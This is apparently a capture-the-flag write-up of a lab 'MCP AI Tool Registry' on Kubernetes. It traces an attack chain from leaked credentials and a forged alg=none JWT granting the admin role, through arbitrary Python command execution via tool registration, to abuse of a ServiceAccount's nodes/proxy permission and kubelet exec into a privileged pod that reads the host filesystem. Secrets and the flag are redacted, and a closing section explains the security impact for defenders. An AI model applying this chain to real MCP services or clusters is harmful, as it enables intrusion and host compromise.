@@ -1,0 +1,1143 @@
+# Task Force Nightfall — MCP AI Tool Registry / Kubernetes
+
+## Introduction
+
+This write-up documents the exploitation path used to compromise the MCP AI Tool Registry and obtain the root flag.
+
+The objective was not achieved through a single vulnerability, but by chaining several weaknesses together:
+
+```text
+Exposed credentials
+        ↓
+JWT authentication
+        ↓
+JWT alg=none
+        ↓
+Admin role
+        ↓
+Arbitrary tool registration
+        ↓
+Python code execution
+        ↓
+Kubernetes ServiceAccount
+        ↓
+RBAC enumeration
+        ↓
+nodes/proxy permission
+        ↓
+Kubelet API
+        ↓
+Privileged pod
+        ↓
+Host filesystem mounted
+        ↓
+Read root flag
+```
+
+> **Note:** Sensitive values such as credentials, JWTs, IP addresses where appropriate, and the final flag have been redacted from this public write-up.
+
+---
+
+# 1. Initial Enumeration
+
+The first interesting artifact was an MCP configuration file:
+
+```bash
+cat ~/.mcp/config.json
+```
+
+It contained configuration for the MCP server and credentials.
+
+For the public version of this write-up, the sensitive values are represented as:
+
+```json
+{
+  "server": "http://<TARGET>:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "<USERNAME>",
+  "password": "<REDACTED_PASSWORD>"
+}
+```
+
+The important discovery was that valid credentials were stored locally and could be used to authenticate against the MCP service.
+
+---
+
+# 2. MCP Service Enumeration
+
+The credentials were tested against the version endpoint:
+
+```bash
+curl -i -u '<USERNAME>:<REDACTED_PASSWORD>' \
+  http://<TARGET>:30080/api/v1/version
+```
+
+The server returned information about its authentication mechanism and available endpoints.
+
+One particularly interesting section was:
+
+```json
+{
+  "auth": {
+    "type": "JWT",
+    "header": "Authorization: Bearer <token>",
+    "supported_algorithms": [
+      "HS256",
+      "none"
+    ]
+  }
+}
+```
+
+The service explicitly indicated support for both:
+
+```text
+HS256
+none
+```
+
+This immediately made the JWT implementation worth investigating.
+
+---
+
+# 3. JWT Analysis
+
+After authenticating, a JWT was obtained.
+
+The token followed the standard structure:
+
+```text
+HEADER.PAYLOAD.SIGNATURE
+```
+
+The payload was decoded locally.
+
+The legitimate token contained:
+
+```json
+{
+  "sub": "<USERNAME>",
+  "role": "user"
+}
+```
+
+Therefore, the current account had:
+
+```text
+role=user
+```
+
+---
+
+# 4. First Failure — Insufficient Privileges
+
+The first attempt was to register a new tool using the normal user token:
+
+```bash
+curl -i -X POST http://<TARGET>:30080/api/v1/tools \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{}'
+```
+
+The server responded:
+
+```json
+{
+  "detail": "Admin role required"
+}
+```
+
+This was an important finding.
+
+The authentication itself worked, but the authorization layer required:
+
+```text
+role=admin
+```
+
+for tool registration.
+
+Instead of trying to brute-force credentials, the JWT implementation was investigated.
+
+---
+
+# 5. JWT `alg=none`
+
+The `/api/v1/version` response had already revealed:
+
+```text
+supported_algorithms:
+    HS256
+    none
+```
+
+The original JWT used:
+
+```text
+alg=HS256
+```
+
+The payload contained:
+
+```json
+{
+  "sub": "<USERNAME>",
+  "role": "user"
+}
+```
+
+Because the service accepted the `none` algorithm, it was possible in the lab environment to construct a token with:
+
+```json
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+```
+
+and a modified payload:
+
+```json
+{
+  "sub": "<USERNAME>",
+  "role": "admin"
+}
+```
+
+The signature portion was empty, as expected for an unsigned JWT:
+
+```text
+HEADER.PAYLOAD.
+```
+
+The resulting token was stored locally as:
+
+```bash
+export TOKEN_ADMIN='<REDACTED_ADMIN_JWT>'
+```
+
+Testing it against the API showed that the server accepted the modified role.
+
+```bash
+curl -i http://<TARGET>:30080/api/v1/tools \
+  -H "Authorization: Bearer $TOKEN_ADMIN"
+```
+
+The response was:
+
+```text
+HTTP/1.1 200 OK
+```
+
+The JWT authorization mechanism was therefore vulnerable to an algorithm/verification flaw.
+
+---
+
+# 6. Second Failure — Invalid Tool Registration
+
+With administrative access available, I attempted to register a tool using an empty JSON object:
+
+```bash
+curl -i -X POST http://<TARGET>:30080/api/v1/tools \
+  -H "Authorization: Bearer $TOKEN_ADMIN" \
+  -H "Content-Type: application/json" \
+  -d '{}'
+```
+
+The API returned:
+
+```text
+422 Unprocessable Entity
+```
+
+with errors indicating that these fields were required:
+
+```text
+name
+description
+code
+```
+
+Rather than guessing the expected format, I inspected the OpenAPI specification.
+
+---
+
+# 7. OpenAPI Enumeration
+
+The API specification was available at:
+
+```text
+/openapi.json
+```
+
+The relevant schema was:
+
+```json
+{
+  "ToolRegisterRequest": {
+    "properties": {
+      "name": {
+        "type": "string"
+      },
+      "description": {
+        "type": "string"
+      },
+      "inputSchema": {
+        "type": "object"
+      },
+      "code": {
+        "type": "string"
+      }
+    },
+    "required": [
+      "name",
+      "description",
+      "code"
+    ]
+  }
+}
+```
+
+This was a major discovery.
+
+The API was not simply registering metadata for tools.
+
+It accepted a `code` field.
+
+---
+
+# 8. Registering a Test Tool
+
+A simple test tool was registered:
+
+```json
+{
+  "name": "test_tool",
+  "description": "Test tool",
+  "code": "print('hello')"
+}
+```
+
+The API confirmed:
+
+```json
+{
+  "status": "registered",
+  "name": "test_tool"
+}
+```
+
+The tool then appeared in:
+
+```text
+tools/list
+```
+
+---
+
+# 9. Third Failure — `return` Outside Function
+
+The next test attempted to execute a command using:
+
+```python
+import os
+return os.popen("id").read()
+```
+
+The MCP response contained:
+
+```text
+SyntaxError: 'return' outside function
+```
+
+This was another useful clue.
+
+The supplied code was apparently being executed as a Python script rather than being inserted into a function.
+
+Therefore, `return` was invalid at the top level.
+
+The code was changed to:
+
+```python
+import os
+print(os.popen("id").read())
+```
+
+This worked.
+
+The result showed that execution occurred as:
+
+```text
+uid=1000(mcp)
+gid=1000(mcp)
+groups=1000(mcp)
+```
+
+At this point, arbitrary Python/OS command execution had been confirmed inside the MCP container.
+
+---
+
+# 10. Fourth Failure — Direct Flag Access
+
+Since arbitrary commands could now be executed, I first attempted to read the root flag directly:
+
+```python
+import os
+print(os.popen("cat /root/root/root.txt").read())
+```
+
+The result was:
+
+```text
+cat: /root/root/root.txt: Permission denied
+```
+
+The reason became clear from the previous `id` command:
+
+```text
+uid=1000(mcp)
+```
+
+The process was not root.
+
+This meant that a direct filesystem read was not enough.
+
+Instead of trying random local privilege-escalation techniques, I investigated the execution environment.
+
+---
+
+# 11. Kubernetes Discovery
+
+The container contained Kubernetes ServiceAccount files:
+
+```text
+/var/run/secrets/kubernetes.io/serviceaccount/
+```
+
+The directory contained:
+
+```text
+ca.crt
+namespace
+token
+```
+
+The namespace file contained:
+
+```text
+default
+```
+
+The environment also contained Kubernetes-related variables:
+
+```text
+KUBERNETES_SERVICE_HOST=<KUBERNETES_SERVICE_IP>
+KUBERNETES_SERVICE_PORT=443
+```
+
+This confirmed that the MCP service was running inside a Kubernetes cluster.
+
+---
+
+# 12. Fifth Failure — `kubectl` Not Installed
+
+The next step was to check Kubernetes permissions with:
+
+```bash
+kubectl auth can-i --list
+```
+
+However:
+
+```text
+kubectl: not found
+```
+
+The container did not contain the Kubernetes command-line client.
+
+This was not a blocker.
+
+Kubernetes exposes an HTTPS API, and the ServiceAccount token mounted inside the container could be used directly.
+
+---
+
+# 13. Direct Kubernetes API Access
+
+The ServiceAccount token was read from:
+
+```text
+/var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+The Kubernetes API was then queried directly using Python.
+
+An initial attempt resulted in:
+
+```text
+401 Unauthorized
+```
+
+This was another troubleshooting step.
+
+The request was corrected to explicitly use the ServiceAccount token:
+
+```text
+Authorization: Bearer <SERVICE_ACCOUNT_TOKEN>
+```
+
+The API then responded successfully.
+
+The Kubernetes API returned information indicating the available API versions.
+
+This confirmed that the ServiceAccount credentials were valid.
+
+---
+
+# 14. Kubernetes RBAC Enumeration
+
+The next step was determining what the ServiceAccount could actually do.
+
+A:
+
+```text
+SelfSubjectRulesReview
+```
+
+request was sent to the Kubernetes authorization API.
+
+The important result was:
+
+```json
+{
+  "resourceRules": [
+    {
+      "verbs": [
+        "get"
+      ],
+      "apiGroups": [
+        ""
+      ],
+      "resources": [
+        "nodes/proxy"
+      ]
+    }
+  ]
+}
+```
+
+The ServiceAccount therefore had:
+
+```text
+get nodes/proxy
+```
+
+This permission was particularly interesting because it provides access to the node proxy functionality and can expose the kubelet interface.
+
+---
+
+# 15. Sixth Failure — Direct Pod Enumeration
+
+Before using `nodes/proxy`, I checked whether the ServiceAccount could simply list pods.
+
+A:
+
+```text
+SelfSubjectAccessReview
+```
+
+was performed for:
+
+```text
+verb=list
+resource=pods
+```
+
+The result was:
+
+```json
+{
+  "status": {
+    "allowed": false
+  }
+}
+```
+
+Therefore:
+
+```text
+list pods = false
+```
+
+This meant the normal Kubernetes API could not be used to enumerate pods with this ServiceAccount.
+
+However:
+
+```text
+nodes/proxy = allowed
+```
+
+provided an alternative route.
+
+---
+
+# 16. Kubelet Enumeration
+
+The Kubernetes API server and kubelet are different components.
+
+The Kubernetes API server was accessible through:
+
+```text
+443
+```
+
+while the kubelet exposes its API through:
+
+```text
+10250
+```
+
+The `nodes/proxy` permission suggested investigating the kubelet.
+
+The kubelet API was queried for its pod information.
+
+This eventually exposed the workloads running on the node.
+
+---
+
+# 17. Discovering the Privileged Pod
+
+The pod information revealed a particularly interesting workload:
+
+```text
+Namespace:
+monitoring
+
+Pod:
+prometheus-prometheus-node-exporter-<REDACTED>
+
+Container:
+node-exporter
+```
+
+Its security configuration showed:
+
+```text
+privileged=True
+```
+
+The container also had mounts similar to:
+
+```text
+/host/proc
+/host/sys
+/host/root
+```
+
+This was the critical discovery.
+
+The pod was privileged and had access to the host filesystem.
+
+---
+
+# 18. Understanding the Host Mount
+
+The mount:
+
+```text
+/host/root
+```
+
+represented the root filesystem of the Kubernetes node.
+
+Therefore, a file such as:
+
+```text
+/host/root/root/root.txt
+```
+
+corresponded to:
+
+```text
+/root/root/root.txt
+```
+
+on the host.
+
+The attack path had now become:
+
+```text
+MCP container
+      ↓
+Kubernetes ServiceAccount
+      ↓
+nodes/proxy
+      ↓
+Kubelet
+      ↓
+Privileged node-exporter pod
+      ↓
+/host/root
+      ↓
+Host filesystem
+```
+
+---
+
+# 19. Kubelet WebSocket Execution
+
+The kubelet exec endpoint uses WebSockets.
+
+The communication used the Kubernetes channel subprotocol:
+
+```text
+v4.channel.k8s.io
+```
+
+Python's `websockets` library was available inside the MCP container.
+
+A test confirmed:
+
+```text
+websockets OK
+```
+
+The kubelet exec endpoint was then used against:
+
+```text
+Namespace: monitoring
+Pod: prometheus-prometheus-node-exporter-<REDACTED>
+Container: node-exporter
+```
+
+The command executed through the kubelet targeted the host-mounted filesystem.
+
+Conceptually, the command was:
+
+```text
+cat /host/root/root/root.txt
+```
+
+---
+
+# 20. Final Result
+
+The kubelet successfully executed the command inside the privileged pod.
+
+The file containing the root flag was therefore readable through the host filesystem mount.
+
+The actual flag has intentionally been removed from this public write-up.
+
+```text
+[FLAG REDACTED]
+```
+
+---
+
+# 21. Complete Attack Chain
+
+The complete attack chain was:
+
+```text
+1. Discover MCP configuration
+          ↓
+2. Recover exposed credentials
+          ↓
+3. Authenticate to MCP service
+          ↓
+4. Inspect JWT
+          ↓
+5. Discover alg=none support
+          ↓
+6. Forge JWT with admin role
+          ↓
+7. Access administrative tool registration
+          ↓
+8. Inspect OpenAPI specification
+          ↓
+9. Discover arbitrary code field
+          ↓
+10. Register custom Python tool
+          ↓
+11. Achieve OS command execution
+          ↓
+12. Discover execution as mcp UID 1000
+          ↓
+13. Discover Kubernetes environment
+          ↓
+14. Locate ServiceAccount token
+          ↓
+15. Query Kubernetes API
+          ↓
+16. Enumerate RBAC permissions
+          ↓
+17. Discover nodes/proxy
+          ↓
+18. Discover kubelet access
+          ↓
+19. Enumerate kubelet pods
+          ↓
+20. Find privileged node-exporter pod
+          ↓
+21. Identify /host/root mount
+          ↓
+22. Execute command through kubelet
+          ↓
+23. Read host root flag
+```
+
+---
+
+# 22. Troubleshooting Timeline
+
+One of the most useful parts of this challenge was the troubleshooting process.
+
+### Attempt 1
+
+```text
+Use normal JWT
+```
+
+Result:
+
+```text
+403 — Admin role required
+```
+
+**Lesson:** Authentication and authorization are separate.
+
+---
+
+### Attempt 2
+
+```text
+POST /api/v1/tools with {}
+```
+
+Result:
+
+```text
+422 — Missing name, description and code
+```
+
+**Lesson:** Read the API specification instead of guessing the request format.
+
+---
+
+### Attempt 3
+
+```python
+return os.popen("id").read()
+```
+
+Result:
+
+```text
+SyntaxError: 'return' outside function
+```
+
+**Lesson:** The supplied code was executed as a script.
+
+---
+
+### Attempt 4
+
+```python
+print(os.popen("id").read())
+```
+
+Result:
+
+```text
+uid=1000(mcp)
+```
+
+**Lesson:** Arbitrary command execution confirmed, but the process was not root.
+
+---
+
+### Attempt 5
+
+```text
+cat /root/root/root.txt
+```
+
+Result:
+
+```text
+Permission denied
+```
+
+**Lesson:** Direct host access was unavailable from the MCP container.
+
+---
+
+### Attempt 6
+
+```text
+kubectl auth can-i --list
+```
+
+Result:
+
+```text
+kubectl: not found
+```
+
+**Lesson:** Kubernetes can be accessed directly through its API without `kubectl`.
+
+---
+
+### Attempt 7
+
+```text
+Kubernetes API request
+```
+
+Result:
+
+```text
+401 Unauthorized
+```
+
+**Lesson:** The ServiceAccount token had to be explicitly supplied.
+
+---
+
+### Attempt 8
+
+```text
+list pods
+```
+
+Result:
+
+```text
+allowed=false
+```
+
+**Lesson:** Normal Kubernetes RBAC enumeration was restricted.
+
+---
+
+### Attempt 9
+
+```text
+nodes/proxy
+```
+
+Result:
+
+```text
+allowed
+```
+
+**Lesson:** The kubelet became the next attack surface.
+
+---
+
+### Attempt 10
+
+```text
+Initial kubelet tests
+```
+
+Result:
+
+```text
+No useful response
+```
+
+**Lesson:** The correct node/kubelet endpoint and protocol had to be identified.
+
+---
+
+### Attempt 11
+
+```text
+Kubelet pod enumeration
+```
+
+Result:
+
+```text
+Privileged node-exporter pod discovered
+```
+
+**Lesson:** The combination of `nodes/proxy` and a privileged pod created a path to the host.
+
+---
+
+# 23. Security Impact
+
+The vulnerabilities found in the challenge can be grouped into several categories.
+
+## Credential Exposure
+
+Sensitive MCP credentials were stored in a local configuration file.
+
+Impact:
+
+```text
+Unauthorized authentication
+```
+
+---
+
+## Broken JWT Validation
+
+The service accepted:
+
+```text
+alg=none
+```
+
+and trusted the JWT role claim.
+
+Impact:
+
+```text
+User → Admin privilege escalation
+```
+
+---
+
+## Arbitrary Code Execution
+
+Administrators could register tools containing arbitrary Python code.
+
+Impact:
+
+```text
+Remote code execution inside MCP container
+```
+
+---
+
+## Excessive Kubernetes Permission
+
+The ServiceAccount had:
+
+```text
+get nodes/proxy
+```
+
+Impact:
+
+```text
+Access to kubelet functionality
+```
+
+---
+
+## Privileged Pod
+
+A node-exporter pod was configured as:
+
+```text
+privileged=True
+```
+
+Impact:
+
+```text
+Significantly increased container privileges
+```
+
+---
+
+## Host Filesystem Exposure
+
+The pod mounted the host filesystem through:
+
+```text
+/host/root
+```
+
+Impact:
+
+```text
+Potential host filesystem compromise
+```
+
+---
+
+# 24. Lessons Learned
+
+This challenge demonstrated the importance of following evidence rather than assuming the first approach will work.
+
+Several failed attempts provided useful information:
+
+```text
+403
+ ↓
+Investigate JWT
+
+422
+ ↓
+Inspect OpenAPI
+
+SyntaxError
+ ↓
+Understand code execution context
+
+Permission denied
+ ↓
+Investigate container privileges
+
+kubectl not found
+ ↓
+Use Kubernetes API directly
+
+401
+ ↓
+Correct ServiceAccount authentication
+
+pods allowed=false
+ ↓
+Investigate RBAC alternatives
+
+nodes/proxy allowed
+ ↓
+Investigate kubelet
+
+Privileged pod discovered
+ ↓
+Investigate host mounts
+
+/host/root
+ ↓
+Host filesystem access
+```
+
+The key lesson was that every failed request reduced the uncertainty about the environment.
+
+---
+
+# 25. Final Takeaway
+
+The root compromise was the result of chaining multiple security weaknesses rather than exploiting a single vulnerability.
+
+The most important chain was:
+
+```text
+JWT validation weakness
+        +
+Admin functionality
+        +
+Arbitrary Python execution
+        +
+Kubernetes ServiceAccount
+        +
+nodes/proxy
+        +
+Kubelet
+        +
+Privileged pod
+        +
+Host filesystem mount
+        =
+Host-level access
+```
+
+The flag was successfully obtained, but its value has been intentionally **redacted from this public GitHub write-up**.
